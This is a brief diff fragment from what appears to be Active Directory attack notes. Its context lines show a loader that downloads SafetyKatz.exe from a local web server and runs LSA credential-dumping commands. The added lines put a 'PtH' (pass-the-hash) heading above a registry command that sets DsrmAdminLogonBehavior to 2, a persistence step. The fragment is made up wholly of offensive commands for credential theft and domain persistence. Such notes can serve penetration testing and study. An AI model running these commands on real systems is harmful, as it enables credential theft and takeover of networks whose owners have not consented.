@@ -8,6 +8,7 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args toke
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args token::elevate lsadump::lsa /patch exit"
 ```
 
+PtH
 ```powershell
 reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
 
